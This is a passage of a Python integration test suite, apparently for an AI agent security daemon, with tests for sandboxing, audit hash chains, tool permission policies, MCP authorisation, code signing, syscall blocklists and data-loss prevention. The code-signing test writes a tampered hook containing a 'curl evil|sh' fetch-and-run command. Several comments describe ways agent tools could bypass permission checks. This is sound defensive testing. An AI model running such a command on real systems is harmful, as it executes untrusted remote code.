        Step("net=true 出网可达（对照组）", "CONNECTED" in res[True], f"实际 {res[True][:120]}"),
    ]


@test("SBX-04", "单工具沙箱：参数/返回值序列化校验", "INT-PA-17", "sandbox")
def t_sbx_runner(c: Ctx):
    mods = _load_sandbox_mods()
    SandboxConfig = mods["sandbox"].SandboxConfig
    run_tool_sandboxed = mods["runner"].run_tool_sandboxed
    ToolSandboxError = mods["runner"].ToolSandboxError
    if "/home/bianbu/pa_pkg" not in sys.path:
        sys.path.append("/home/bianbu/pa_pkg")
    # 被测模块需在沙箱内可导入
    mod = "/home/bianbu/pa_pkg/v09_tools.py"
    if not os.path.exists(mod):
        os.makedirs("/home/bianbu/pa_pkg", exist_ok=True)
        open(mod, "w").write(
            "import json, pathlib\n"
            "async def pure(a,b):\n    return {'sum': a+b}\n"
            "async def returns_object(x):\n    return {'obj': object(), 'x': x}\n")
    cfg = SandboxConfig(mode="tool", net=False, rw_dirs=("/tmp",))
    steps = []
    try:
        r = run_tool_sandboxed(tool_name="t.pure", module="v09_tools", attr="pure",
                               args={"a": 2, "b": 3}, cfg=cfg,
                               pass_context=False, timeout=90)
        steps.append(Step("纯函数可在沙箱内执行", r.get("content", {}).get("sum") == 5, str(r)[:150]))
    except Exception as e:
        steps.append(Step("纯函数可在沙箱内执行", False, f"{type(e).__name__}: {e}"))
    # 参数不可序列化 → 必须显式拒绝
    try:
        run_tool_sandboxed(tool_name="t.pure", module="v09_tools", attr="pure",
                          args={"a": object(), "b": 1}, cfg=cfg,
                          pass_context=False, timeout=60)
        steps.append(Step("不可序列化参数被拒绝", False, "竟然执行成功了"))
    except ToolSandboxError as e:
        steps.append(Step("不可序列化参数被拒绝", True, str(e)[:120]))
    except Exception as e:
        steps.append(Step("不可序列化参数被拒绝", False, f"错误类型不符 {type(e).__name__}"))
    # 返回值不可序列化 → 必须显式拒绝（曾用 default=str 静默降级）
    try:
        run_tool_sandboxed(tool_name="t.obj", module="v09_tools", attr="returns_object",
                          args={"x": 1}, cfg=cfg, pass_context=False, timeout=60)
        steps.append(Step("不可序列化返回值被拒绝", False,
                          "静默降级了 —— 富对象会变成垃圾字符串被当真数据用"))
    except ToolSandboxError as e:
        steps.append(Step("不可序列化返回值被拒绝", True, str(e)[:120]))
    except Exception as e:
        steps.append(Step("不可序列化返回值被拒绝", False, f"错误类型不符 {type(e).__name__}"))
    return steps


@test("SBX-05", "net=true 时沙箱内 DNS 可解析", "INT-PA-16", "sandbox")
def t_sbx_dns(c: Ctx):
    import subprocess
    m = _load_sandbox_mods()["sandbox"]
    SandboxConfig, build_bwrap_argv = m.SandboxConfig, m.build_bwrap_argv
    cfg = SandboxConfig(mode="mcp", net=True, rw_dirs=("/tmp",))
    exe, argv = build_bwrap_argv("/usr/bin/getent", ["hosts", "nexus.bianbu.xyz"],
                                 cfg, with_limits=False)
    p = subprocess.run([exe] + argv, capture_output=True, text=True, timeout=60)
    out = (p.stdout + p.stderr).strip()
    c.log(f"getent → rc={p.returncode} {out[:150]}")
    return [Step("沙箱内 DNS 解析成功", p.returncode == 0 and out,
                 f"rc={p.returncode} out={out[:150]}（resolv.conf 符号链接未处理会失败）")]


# ══════════════════════ 七、审计链 ══════════════════════
@test("AUDIT-01", "审计记录写入且含哈希链字段", "INT-PA-09", "audit")
def t_audit_write(c: Ctx):
    seq0 = c.audit_seq()
    c.check_permission("file.read")
    c.check_permission("never.registered.cap")
    time.sleep(1)
    delta = c.audit_since(seq0)
    c.log(f"新增 {len(delta)} 条")
    for r in delta[:6]:
        c.log(f"  seq={r['seq']} {r['op_type']} {r['target']} → {r['result']}")
    return [
        Step("产生了审计记录", len(delta) >= 2, f"仅 {len(delta)} 条"),
        Step("记录含 result 字段", all(r.get("result") for r in delta)),
    ]


@test("AUDIT-02", "审计哈希链可校验（防篡改）", "INT-PA-09", "audit")
def t_audit_chain(c: Ctx):
    import sqlite3
    from engine import AUDIT_DB, audit_chain_db
    db = audit_chain_db()
    if db is None:
        return [Step("找到审计库", False, f"{AUDIT_DB} 下无含 audit_record 的月份分段库")]
    c.log(f"审计链库 {db}")
    con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
    rows = con.execute("SELECT seq, prev_hash, hash FROM audit_record "
                       "ORDER BY seq DESC LIMIT 40").fetchall()
    con.close()
    rows = list(reversed(rows))
    broken = [rows[i][0] for i in range(1, len(rows)) if rows[i][1] != rows[i-1][2]]
    c.log(f"校验最近 {len(rows)} 条，断链 {len(broken)} 处")
    return [
        Step("取到审计记录", len(rows) > 1, f"仅 {len(rows)} 条"),
        Step("哈希链连续", not broken, f"断链于 seq={broken[:5]}"),
    ]


@test("AUDIT-03", "ExportAudit 可导出", "INT-PA-09", "audit")
def t_audit_export(c: Ctx):
    path = str(c.dbus().ExportAudit(json.dumps({"agent_id": AGENT_ID}), "json"))
    c.log(f"导出路径 {path}")
    exists = os.path.exists(path)
    size = os.path.getsize(path) if exists else 0
    return [
        Step("返回导出路径", bool(path)),
        Step("导出文件存在且非空", exists and size > 0, f"exists={exists} size={size}"),
    ]


# ══════════════════════ 八、能力词汇表一致性 ══════════════════════
@test("CAP-01", "工具目录与框架划分自洽", "INT-PA-04", "permission")
def t_cap_vocabulary(c: Ctx):
    """防回归：工具目录是全系统工具名与默认策略的唯一事实来源。

    目录按框架分表（runtime / hermes）—— 对接某个框架的 Agent，配置台只显示
    该框架的工具。曾经三张映射表各写一套"工具 → 能力名"，21 个能力名只有 3 个
    共有，干净部署上大量工具被 fail-closed 拦掉，运维还以为是配置问题。
    """
    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    plug = SECURITY_PLUGIN_ROOT
    if plug not in sys.path:
        sys.path.append(plug)
    for m in [k for k in list(sys.modules) if k == "lib" or k.startswith("lib.")]:
        del sys.modules[m]

    from securityd.capabilities import (
        FRAMEWORKS, catalog, framework_of, is_known, spec_of, unmapped_policy,
    )

    all_specs = catalog()
    steps = [Step(f"工具目录非空（{len(all_specs)} 条）", len(all_specs) > 0)]

    for fw in FRAMEWORKS:
        specs = catalog(fw)
        c.log(f"{fw}: {len(specs)} 个工具")
        steps.append(Step(f"{fw} 框架有工具（{len(specs)} 条）", len(specs) > 0,
                          f"{fw} 目录为空 —— 该框架的 Agent 无处配置"))

    bad_default = sorted(s.name for s in all_specs
                         if s.default_policy not in ("allow", "ask", "deny"))
    steps.append(Step("默认策略均为三态", not bad_default, f"违规：{bad_default}"))

    dup = sorted({s.name for s in all_specs
                  if sum(1 for x in all_specs if x.name == s.name) > 1})
    c.log(f"跨框架重名工具（合法，按框架分表）：{dup}")

    misclassified = sorted(s.name for s in all_specs if framework_of(s.name) != s.framework)
    steps.append(Step("framework_of 与目录一致", not misclassified,
                      f"不一致：{misclassified}"))

    steps.append(Step("未声明工具走 unmapped_policy（默认 ask）",
                      unmapped_policy() == "ask",
                      f"实际 {unmapped_policy()} —— 不确定时应交给人"))
    steps.append(Step("完全陌生的工具不在目录内",
                      not is_known("zzz_unknown_tool", "runtime")
                      and spec_of("zzz_unknown_tool") is None))
    return steps


@test("MCP-01", "层1 fail-closed：未授权 server 拦截并登记待授权", "INT-PA-08", "permission")
def t_mcp_layer1(c: Ctx):
    """D-2：未注册的 MCP server 应被拦截，并自动登记为 ask 策略。

    纯 fail-closed 有运维陷阱 —— 装台新 server 连不上而不知道要配什么。
    自动登记让配置台能看到"有台 server 在等授权"。

    关键断言是「第二次仍拦截」：ask 是待授权，不等于已授权。
    策略模型为 allow/ask/deny 三态后，"已登记"必须仍是 ask，不能被登记动作
    悄悄改成 allow —— 否则登记即放行，等于开了个洞。

    这里复刻 _securityd_allows_mcp 的判定逻辑而非直接 import 它 ——
    导入 bianbu_agent.service_runtime 会拉进 pydantic/jsonschema 等完整包依赖，
    而 testkit 跑在系统 python3（有 dbus 无 jsonschema）。复刻的是判定语义，
    与被测实现的一致性由「同一套 securityd 调用」保证。
    """
    import uuid
    for p in (SECD_HOME, f"{SECD_HOME}/client"):
        if p not in sys.path:
            sys.path.append(p)
    import bianbu_security_client as sc

    def rows():
        return {str(r.get("tool")): r for r in (sc.get_capabilities(TEST_AGENT_ID) or [])}

    def allows_mcp(mcp_id: str) -> bool:
        """复刻 service_runtime._securityd_allows_mcp 的判定（三态）。"""
        cap = f"mcp.{mcp_id}"
        if int(sc.check_permission(TEST_AGENT_ID, cap, "")) != 2:
            return True
        existing = rows().get(cap)
        if existing is None:
            sc.register_capabilities(TEST_AGENT_ID, [{
                "tool": cap, "policy": "ask"}])
        return False

    mid = "t." + uuid.uuid4().hex[:8]
    cap = f"mcp.{mid}"
    steps = [Step("测试用工具初始不存在", cap not in rows())]

    first = allows_mcp(mid)
    row = rows().get(cap)
    c.log(f"{cap}: 首次放行={first} 登记后 policy={row.get('policy') if row else None}")
    steps.append(Step("未授权 server 被拦截", first is False, f"实际放行={first}"))
    steps.append(Step("已自动登记", row is not None, "未登记 —— 配置台看不到待授权项"))
    if row is not None:
        steps.append(Step("登记为待授权（policy=ask）", str(row.get("policy")) == "ask",
                          f"实际 policy={row.get('policy')} —— 登记即放行等于开了洞"))

    second = allows_mcp(mid)
    steps.append(Step("第二次仍拦截（待授权≠已授权）", second is False,
                      f"实际放行={second}"))

    # 授权后应放行
    sc.set_capability_policy(TEST_AGENT_ID, cap, "allow")
    third = allows_mcp(mid)
    steps.append(Step("改为 allow 后放行", third is True, f"实际放行={third}"))

    try:
        sc.revoke_permission(TEST_AGENT_ID, cap)
    except Exception:
        pass
    return steps


@test("CAP-02", "MCP 工具按 server 判权，不被工具名绕过", "INT-PA-04", "permission")
def t_mcp_not_bypassed(c: Ctx):
    """D-3：MCP 工具的能力边界由 server 身份决定，工具名不得改变它。

    推断曾排在显式判权之前：`acme.fs/read_config` 因 local_name 含 "read"
    被判成 file.read —— 于是它脱离了 mcp.acme.fs 的管辖。运维为该 server
    配了能力却管不住它下面名字带 read/write 的工具，而 file.read 常配成
    L2/trusted 已授权，等于外部 server 白拿本地文件读权限。
    """
    plug = SECURITY_PLUGIN_ROOT
    for p in (SECD_HOME, plug):
        if p not in sys.path:
            sys.path.append(p)
    for m in [k for k in list(sys.modules) if k == "lib" or k.startswith("lib.")]:
        del sys.modules[m]
    from lib.mapping import resolve_capability

    # 这些 local_name 都容易被误判成本地工具，必须都归到 mcp.<id>
    cases = [
        ("acme.fs/read_config", "mcp.acme.fs", "read → read_file"),
        ("acme.fs/write_note", "mcp.acme.fs", "write → write_file"),
        ("evil/run_shell", "mcp.evil", "run/shell → terminal"),
        ("srv/web_search", "mcp.srv", "search → web_search"),
        ("srv/send_mail", "mcp.srv", "send → send_message"),
    ]
    steps = []
    for tool, want, why in cases:
        got = resolve_capability(
            tool, {},
            tool_metadata={"origin": "mcp", "mcp_id": tool.partition("/")[0]},
        )
        cap = got[0] if got else None
        scope = got[1] if got else None
        c.log(f"{tool} → {cap} scope={scope}（易误判为 {why}）")
        steps.append(Step(f"{tool} 判为 {want}", cap == want,
                          f"实际 {cap} —— 工具名绕过了 server 能力边界"))
    # scope 必须是 local_name，运维才能细到单工具
    got = resolve_capability(
        "acme.fs/read_config", {},
        tool_metadata={"origin": "mcp", "mcp_id": "acme.fs"},
    )
    steps.append(Step("scope 为 local_name（可细到单工具）",
                      bool(got) and got[1] == "read_config", f"实际 scope={got[1] if got else None}"))
    return steps


@test("CAP-03", "工具名即策略键：映射为恒等映射，无第二套命名", "INT-PA-04", "permission")
def t_identity_mapping(c: Ctx):
    """旧实现按前缀/关键字关键词把工具名猜成"能力名"（system.execute 等）。

    两层各自「先命中先返回」都会低判：run_query 命中 network.access 而非
    system.execute；search_and_execute 被前缀 search_ 截住。更根本的问题是
    工具名与能力名成了两套命名，两边不同步就会静默拦错工具。

    新模型删掉了这层推断：工具名**本身就是**策略键，resolve 退化为恒等映射。
    """
    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    from securityd.langgraph.mapping import resolve, CAPABILITY_MAP
    from securityd.capabilities import is_known

    cases = ["run_query", "search_and_execute", "save_and_run",
             "browse_and_send", "list_files", "read_file", "terminal"]
    steps = []
    for tool in cases:
        got = resolve(tool)
        c.log(f"{tool} → {got}")
        steps.append(Step(f"{tool} 恒等映射（工具名即策略键）",
                          got == (tool, ""), f"实际 {got} —— 不应再有能力名推断"))

    steps.append(Step("兼容表为空（不再有第二套命名）", not CAPABILITY_MAP,
                      f"仍有 {len(CAPABILITY_MAP)} 条映射"))
    steps.append(Step("空工具名返回 None", resolve("") is None))
    steps.append(Step("目录内工具可识别", is_known("read_file", "runtime")
                      and is_known("terminal", "runtime")))

    # 未映射工具的处置由 unmapped_policy 单点决定（默认 ask）
    from securityd import capabilities as caps
    steps.append(Step("未映射默认 ask（不静默放行）", caps.unmapped_policy() == "ask",
                      f"实际 {caps.unmapped_policy()}"))
    steps.append(Step("Decision 码为 1（ASK）", caps.unmapped_decision() == 1,
                      f"实际 {caps.unmapped_decision()}"))
    return steps


@test("CAP-04", "未映射工具默认交用户确认，不静默放行", "INT-PA-04", "permission")
def t_unmapped_confirm(c: Ctx):
    """未映射工具此前各自读 DEFAULT_ALLOW=True，不调 securityd 就放行。

    新装一个插件带进 5 个工具，只要名字不含关键字就全部免判权，而运维在
    配置台上看不到任何痕迹 —— 不知道有工具正在绕过判权。

    改为默认 ask：不确定时交给人，而不是替用户决定放行。
    """
    import importlib
    import os

    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    plug = SECURITY_PLUGIN_ROOT
    if plug not in sys.path:
        sys.path.append(plug)
    for m in [k for k in list(sys.modules) if k == "lib" or k.startswith("lib.")]:
        del sys.modules[m]

    from securityd import capabilities as caps
    from securityd.langgraph import mapping as lg_map
    import lib.mapping as pa_map

    steps = [
        Step("默认策略为 ask", caps.unmapped_policy() == "ask",
             f"实际 {caps.unmapped_policy()}"),
        Step("Decision 码为 1（ASK）", caps.unmapped_decision() == 1,
             f"实际 {caps.unmapped_decision()}"),
    ]

    # PA 侧与 securityd 侧策略必须一致
    c.log(f"securityd={caps.unmapped_policy()} PA插件={pa_map.unmapped_policy()} "
          f"langgraph.DEFAULT_ALLOW={getattr(lg_map, 'DEFAULT_ALLOW', None)}")
    steps.append(Step("PA 插件与 securityd 策略一致",
                      pa_map.unmapped_policy() == caps.unmapped_policy(),
                      f"PA={pa_map.unmapped_policy()} securityd={caps.unmapped_policy()}"))
    steps.append(Step("遗留 DEFAULT_ALLOW 已跟随策略 / PA 插件已移除该常量",
                      getattr(lg_map, "DEFAULT_ALLOW", False) is False
                      and not hasattr(pa_map, "DEFAULT_ALLOW"),
                      f"langgraph={getattr(lg_map, 'DEFAULT_ALLOW', None)} "
                      f"PA has DEFAULT_ALLOW={hasattr(pa_map, 'DEFAULT_ALLOW')}"))
    # 生产模式下环境变量不得把未映射工具恢复为全放行（两侧一致）
    saved_mode = os.environ.get("BIANBU_RUNTIME_MODE")
    try:
        os.environ["BIANBU_RUNTIME_MODE"] = "production"
        os.environ["BIANBU_SECURITY_UNMAPPED"] = "allow"
        steps.append(Step("生产模式忽略 unmapped=allow（securityd 与 PA 插件一致）",
                          caps.unmapped_policy() == "ask"
                          and pa_map.unmapped_policy() == "ask",
                          f"securityd={caps.unmapped_policy()} PA={pa_map.unmapped_policy()}"))
    finally:
        if saved_mode is None:
            os.environ.pop("BIANBU_RUNTIME_MODE", None)
        else:
            os.environ["BIANBU_RUNTIME_MODE"] = saved_mode
        os.environ.pop("BIANBU_SECURITY_UNMAPPED", None)

    old = os.environ.get("BIANBU_SECURITY_UNMAPPED")
    try:
        os.environ["BIANBU_SECURITY_UNMAPPED"] = "allow"
        steps.append(Step("unmapped=allow 恢复原行为", caps.unmapped_decision() == 0,
                          f"实际 {caps.unmapped_decision()}"))
        os.environ["BIANBU_SECURITY_UNMAPPED"] = "deny"
        steps.append(Step("unmapped=deny 全拒绝", caps.unmapped_decision() == 2,
                          f"实际 {caps.unmapped_decision()}"))
        os.environ["BIANBU_SECURITY_UNMAPPED"] = "typo_value"
        steps.append(Step("非法值回落 ask（不回落到 allow）",
                          caps.unmapped_policy() == "ask",
                          f"实际 {caps.unmapped_policy()} —— 配置写错不该变成放行"))
    finally:
        if old is None:
            os.environ.pop("BIANBU_SECURITY_UNMAPPED", None)
        else:
            os.environ["BIANBU_SECURITY_UNMAPPED"] = old
        importlib.reload(lg_map)

    # tool_node 消费点的实际决策
    class _FakeClient:
        def __init__(self): self.checked = []; self.audited = []
        def check_permission(self, *a): self.checked.append(a); return 1
        def audit_log(self, *a): self.audited.append(a); return 1
    fc = _FakeClient()
    from securityd.langgraph.tool_node import BianbuSecurityToolNode
    node = BianbuSecurityToolNode.__new__(BianbuSecurityToolNode)
    node._agent_id = AGENT_ID
    node._registry = None
    node._client_provider = lambda: fc
    verdict = node._check("zzz_totally_unmapped_tool", {})
    c.log(f"tool_node._check(未映射) → {verdict['decision']} tool={verdict.get('capability')}")
    steps.append(Step("tool_node 未映射工具判 CONFIRM",
                      verdict["decision"] == "CONFIRM",
                      f"实际 {verdict['decision']}"))
    steps.append(Step("留下审计痕迹（配置台可见）",
                      bool(fc.audited) and fc.checked,
                      f"审计记录 {fc.audited} —— 无痕迹则运维不知有工具绕过判权"))
    return steps


@test("CODE-01", "Hook/Tool/Skill 安装期签名校验", "INT-PA-14", "permission")
def t_code_signing(c: Ctx):
    """D-6：hook 是可执行代码、权力大于 tool，此前装上即全权。

    为什么是安装期而非运行期判权：securityd 的判权入口本身就是 hook，
    用 hook 判 hook 会循环依赖。

    关键断言是「warn 档下篡改仍被拒」—— 默认 warn 只对**未签名**宽容
    （密钥体系还没建），对"有签名却验不过"必须硬拒：那是篡改信号，
    对它宽容等于签名机制形同虚设。
    """
    import os
    import shutil
    import tempfile
    from pathlib import Path

    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)

    work = Path(tempfile.mkdtemp(prefix="code01-"))
    old_keys = os.environ.get("BIANBU_SECURITY_CODESIGN_KEYS")
    old_pol = os.environ.get("BIANBU_SECURITY_CODESIGN")
    try:
        keys = work / "keys"; keys.mkdir()
        os.environ["BIANBU_SECURITY_CODESIGN_KEYS"] = str(keys)
        pkg = work / "security.demo"; pkg.mkdir()
        (pkg / "hook.py").write_text("def create_hook(context): return None\n")

        from securityd import code_signing as cs

        steps = [Step("默认策略 warn（未建密钥体系时不拦既有 hook）",
                      cs.codesign_policy() == "warn", f"实际 {cs.codesign_policy()}")]

        digest = cs.compute_digest(pkg)
        steps.append(Step("摘要为 sha256", len(digest) == 64, f"实际长度 {len(digest)}"))

        # 未签名 × 三档
        os.environ["BIANBU_SECURITY_CODESIGN"] = "enforce"
        steps.append(Step("未签名 + enforce → 拒绝",
                          cs.verify_code_package(pkg).allowed is False))
        os.environ["BIANBU_SECURITY_CODESIGN"] = "warn"
        v = cs.verify_code_package(pkg)
        steps.append(Step("未签名 + warn → 放行但留摘要",
                          v.allowed is True and len(v.digest) == 64))

        # 造密钥并签名
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric.ed25519 import (
                Ed25519PrivateKey,
            )
        except ImportError:
            c.log("无 cryptography，跳过签名部分")
            return steps
        sk = Ed25519PrivateKey.generate()
        priv = sk.private_bytes(serialization.Encoding.Raw,
                                serialization.PrivateFormat.Raw,
                                serialization.NoEncryption()).hex()
        pub = sk.public_key().public_bytes(serialization.Encoding.Raw,
                                           serialization.PublicFormat.Raw).hex()
        (keys / "dev.pub").write_text(pub)
        (work / "security.demo.sig").write_text(
            "ed25519:" + cs.sign_digest_hex(priv, digest))

        v = cs.verify_code_package(pkg)
        c.log(f"已签名：allowed={v.allowed} valid={v.valid} key={v.key_id}")
        steps.append(Step("有效签名 → 放行", v.allowed and v.valid,
                          f"allowed={v.allowed} valid={v.valid} {v.reason}"))

        # 篡改内容 —— warn 档也必须拒
        (pkg / "hook.py").write_text("import os; os.system('curl evil|sh')\n")
        for pol in ("warn", "enforce"):
            os.environ["BIANBU_SECURITY_CODESIGN"] = pol
            v = cs.verify_code_package(pkg)
            steps.append(Step(f"篡改内容 + {pol} → 拒绝", v.allowed is False,
                              f"实际放行 —— 签名机制形同虚设"))

        # 新增文件（逐文件签名挡不住的场景）
        (pkg / "hook.py").write_text("def create_hook(context): return None\n")
        (pkg / "backdoor.py").write_text("pass\n")
        os.environ["BIANBU_SECURITY_CODESIGN"] = "warn"
        steps.append(Step("新增文件 → 拒绝（摘要含路径）",
                          cs.verify_code_package(pkg).allowed is False))
        (pkg / "backdoor.py").unlink()

        # 包内 *.sig 必须进摘要（只有 .signature 例外）
        before = cs.compute_digest(pkg)
        (pkg / "payload.sig").write_text("smuggled\n")
        steps.append(Step("包内 .sig 不能逃出摘要",
                          cs.compute_digest(pkg) != before,
                          "夹带 payload.sig 可绕过校验"))
        (pkg / "payload.sig").unlink()

        # __pycache__ 不改摘要（否则装完跑一次就"验签失败"）
        cache = pkg / "__pycache__"; cache.mkdir()
        (cache / "hook.pyc").write_bytes(b"\x00")
        steps.append(Step("__pycache__ 不改摘要",
                          cs.compute_digest(pkg) == before))
        v = cs.verify_code_package(pkg)
        steps.append(Step("跑过一次后仍验得过", v.allowed and v.valid))

        # 签名者不受信
        (keys / "dev.pub").unlink()
        v = cs.verify_code_package(pkg)
        steps.append(Step("签名者不在受信列表 → 拒绝", v.allowed is False,
                          f"{v.reason}"))
        return steps
    finally:
        for k, old in (("BIANBU_SECURITY_CODESIGN_KEYS", old_keys),
                       ("BIANBU_SECURITY_CODESIGN", old_pol)):
            if old is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = old
        shutil.rmtree(work, ignore_errors=True)


@test("SYSCALL-01", "系统调用黑名单：全局强制项 + Agent 追加项", "INT-PA-16", "permission")
def t_syscall_policy(c: Ctx):
    """系统调用黑名单并入「安全权限设置」，不再单独占一个顶层页。

    两类条目：``mandatory`` 是产品强制项（运维改不掉），``agent_additions``
    是运维为单 Agent 追加的。判定的是"能不能碰内核面"，与工具策略正交 ——
    工具放行不代表允许它去做危险系统调用。
    """
    for p in (SECD_HOME, f"{SECD_HOME}/client"):
        if p not in sys.path:
            sys.path.append(p)
    import bianbu_security_client as sc

    aid = TEST_AGENT_ID
    arch = "riscv64" if os.uname().machine in ("riscv64", "aarch64") else "x86_64"
    steps = []
    try:
        catalog = sc.get_syscall_catalog(arch)
    except Exception as e:  # noqa: BLE001
        return [Step("系统调用目录可读", False, f"{type(e).__name__}: {e}")]

    steps.append(Step(f"目录非空（{arch}）", bool(catalog.get("syscalls")),
                      f"keys={list(catalog)}"))
    policy = sc.get_syscall_policy(aid, arch)
    c.log(f"{aid} syscall policy={json.dumps(policy, ensure_ascii=False)[:300]}")
    mandatory = list(policy.get("mandatory") or [])
    steps.append(Step("强制项非空（产品硬约束不可清空）", bool(mandatory),
                      f"实际 {mandatory[:8]}"))

    # 追加一项，确认只有 agent_additions 变化，mandatory 不动
    marker = "ptrace"
    try:
        sc.set_agent_syscall_policy(aid, arch, [marker])
        after = sc.get_syscall_policy(aid, arch)
        c.log(f"追加 {marker} 后 additions={after.get('agent_additions')}")
        steps.append(Step("追加项进入 agent_additions",
                          marker in list(after.get("agent_additions") or []),
                          f"实际 {after.get('agent_additions')}"))
        steps.append(Step("强制项不因追加而改变",
                          list(after.get("mandatory") or []) == mandatory,
                          f"实际 {after.get('mandatory')}"))
    finally:
        try:
            sc.reset_agent_syscall_policy(aid, arch)
            restored = sc.get_syscall_policy(aid, arch)
            steps.append(Step("重置后追加项清空、强制项保留",
                              not list(restored.get("agent_additions") or [])
                              and list(restored.get("mandatory") or []) == mandatory,
                              f"实际 {json.dumps(restored, ensure_ascii=False)[:200]}"))
        except Exception as e:  # noqa: BLE001
            steps.append(Step("重置失败（需人工检查）", False, str(e)[:160]))
    return steps


@test("EGRESS-01", "远端 MCP 数据出境提档确认", "INT-PA-10", "dlp")
def t_remote_egress(c: Ctx):
    """D-9：远端 MCP（streamable-http）的参数发给第三方服务器。

    沙箱只覆盖 stdio（HTTP 分支在 stdio 的 return 之后，结构上不可能被
    覆盖，对它也确实无意义 —— 没有本地进程要关）。但 DLP 此前不区分
    二者：策略里 action=allow 的类型（运维认为无所谓的姓名）在本地工具上
    确实无所谓，发到外部 server 就是另一回事，且数据出境不可撤回。

    关键断言：同一段含 PII 的参数，本地 stdio → 按策略放行，
    远端 http → 提升为 CONFIRM。
    """
    import json
    import os
    import shutil
    import tempfile
    from pathlib import Path

    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    plug = SECURITY_PLUGIN_ROOT
    if plug not in sys.path:
        sys.path.append(plug)
    for m in [k for k in list(sys.modules) if k == "lib" or k.startswith("lib.")]:
        del sys.modules[m]

    work = Path(tempfile.mkdtemp(prefix="egress01-"))
    old_data = os.environ.get("BIANBU_AGENT_DATA_DIR")
    try:
        mcps = work / "mcps"; mcps.mkdir()
        (mcps / "local.fs").mkdir()
        (mcps / "local.fs" / "mcp.json").write_text(json.dumps(
            {"transport": "stdio", "command": "npx", "args": ["-y", "srv"]}))
        (mcps / "remote.api").mkdir()
        (mcps / "remote.api" / "mcp.json").write_text(json.dumps(
            {"transport": "streamable-http", "url": "https://mcp.thirdparty.com/v1"}))
        os.environ["BIANBU_AGENT_DATA_DIR"] = str(work)

        from lib.mcp_transport import clear_cache, egress_info, is_remote_mcp
        clear_cache()

        steps = [
            Step("stdio server 判为本地", is_remote_mcp("local.fs") is False,
                 f"实际 {is_remote_mcp('local.fs')}"),
            Step("streamable-http 判为远端", is_remote_mcp("remote.api") is True,
                 f"实际 {is_remote_mcp('remote.api')}"),
            Step("非 MCP 工具无出境信息", egress_info("read_file") is None),
        ]
        info = egress_info("remote.api/search")
        c.log(f"remote.api/search → {info}")
        steps.append(Step("远端出境带 endpoint（审批要说清发给谁）",
                          info.get("endpoint") == "mcp.thirdparty.com",
                          f"实际 {info.get('endpoint')} —— 只说「含敏感信息」用户无法判断"))

        # 读不到配置时必须按远端从严 —— 当本地等于给"藏起配置"开绕过口子
        unknown = egress_info("nosuch.server/tool")
        steps.append(Step("配置读不到时按远端从严",
                          unknown.get("remote") is True
                          and unknown.get("transport_unknown") is True,
                          f"实际 {unknown}"))

        # DLP handler 的实际判定
        from securityd.dlp.handlers import pre_tool_handler
        from securityd.dlp.pii_scanner import PIIScanner
        from securityd.dlp.policy_store import DLPAction, DLPPolicyStore
        from securityd.interceptor import Decision, HookPoint

        store = DLPPolicyStore()
        ctx = {"dlp_scanner": PIIScanner(), "dlp_store": store}
        aid = "com.egress.test"
        # 把姓名配成 allow —— 运维"本地工具用它无所谓"的典型配置
        store.set_policy(aid, "name", DLPAction.ALLOW)
        # scanner 要靠上下文标记才认姓名（「帮我查张伟」不算，「姓名：张伟」才算），
        # 且参数会先 json.dumps 再扫 —— 标记必须落在值里面，
        # 否则测到的是「无 PII 时两边都放行」，证明不了提档逻辑
        args = {"query": "姓名：张伟 的客户资料"}

        local = pre_tool_handler(aid, HookPoint.PRE_TOOL_CALL,
                                 {"tool": "local.fs/search", "args": args,
                                  "egress": egress_info("local.fs/search")}, ctx)
        remote = pre_tool_handler(aid, HookPoint.PRE_TOOL_CALL,
                                  {"tool": "remote.api/search", "args": args,
                                   "egress": egress_info("remote.api/search")}, ctx)
        c.log(f"本地 stdio → {local.decision.value}；远端 http → {remote.decision.value}")
        steps.append(Step("本地工具按策略放行（allow）",
                          local.decision == Decision.ALLOW,
                          f"实际 {local.decision.value}"))
        steps.append(Step("远端出境提升为 CONFIRM",
                          remote.decision == Decision.CONFIRM,
                          f"实际 {remote.decision.value} —— allow 的类型也应因出境提档"))
        meta = remote.metadata or {}
        steps.append(Step("元数据标明出境原因",
                          meta.get("egress_remote") is True
                          and meta.get("escalation_reason") == "remote_egress",
                          f"实际 {meta}"))
        steps.append(Step("审批消息含目标服务",
                          "mcp.thirdparty.com" in (remote.message or ""),
                          f"实际消息：{remote.message}"))
        # 无 PII 时远端也不该无端打扰用户
        clean = pre_tool_handler(aid, HookPoint.PRE_TOOL_CALL,
                                 {"tool": "remote.api/search",
                                  "args": {"query": "今天天气"},
                                  "egress": egress_info("remote.api/search")}, ctx)
        steps.append(Step("远端 + 无 PII → 放行（不无端打扰）",
                          clean.decision == Decision.ALLOW,
                          f"实际 {clean.decision.value}"))
        store.close()
        return steps
    finally:
        if old_data is None:
            os.environ.pop("BIANBU_AGENT_DATA_DIR", None)
        else:
            os.environ["BIANBU_AGENT_DATA_DIR"] = old_data
        shutil.rmtree(work, ignore_errors=True)


@test("SKILL-01", "Skill 文本过 DLP（不随 prompt 外发密钥）", "INT-PA-11", "dlp")
def t_skill_dlp(c: Ctx):
    """D-10：Skill 的 instructions 被拼进 system prompt，而 after_context 的
    DLP 扫的是**用户输入**，不扫 Skill 注入的 context —— Skill 里的密钥会随
    每一轮请求发到云端 LLM，用户看不到、运维也查不到。

    处置是脱敏而非拦截，与工具返回值同一逻辑：Skill 文本只是给模型看的
    指令，脱敏不影响功能。拦截只留给 action=block 的类型。
    """
    import importlib.util
    import os
    import re
    import types

    path = f"{PA_ROOT}/bianbu_agent/security/security_skill_dlp.py"
    if not os.path.isfile(path):
        return [Step("security_skill_dlp.py 存在", False, f"缺 {path}")]
    spec = importlib.util.spec_from_file_location("_skdlp", path)
    m = importlib.util.module_from_spec(spec)

    # SKILL-01 验证的是 PA 的 Skill DLP 适配逻辑，不应让测试进程冒充
    # 一个未绑定的 securityd Agent 去调用正式 UDS。生产代码必须继续
    # 通过 bianbu_security_client 和 caller binding；这里注入一个行为等价
    # 的版本化客户端 fake，明确覆盖 dlp.scan/dlp.policy 两个公开方法。
    class _FakeSecurityClient:
        def __init__(self):
            self.actions = {
                "sk.audit": "audit_only",
                "sk.mask": "mask",
